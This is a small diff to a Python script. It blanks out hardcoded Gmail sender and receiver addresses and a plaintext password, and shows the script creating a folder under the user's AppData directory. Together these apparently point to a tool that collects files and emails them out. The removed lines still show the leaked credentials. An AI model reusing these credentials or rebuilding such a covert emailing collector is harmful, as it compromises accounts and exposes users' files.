@@ -20,9 +20,9 @@ from email.mime.text import MIMEText
 
 user = getpass.getuser()
 
-sender = "parsersenderink@gmail.com"
-receiver = "andrewvorobey123@gmail.com"
-password = "PaladinsPip123"
+sender = ""
+receiver = ""
+password = ""
 
 try:
     os.mkdir(rf"C:\\Users\\{user}\\AppData\\files")
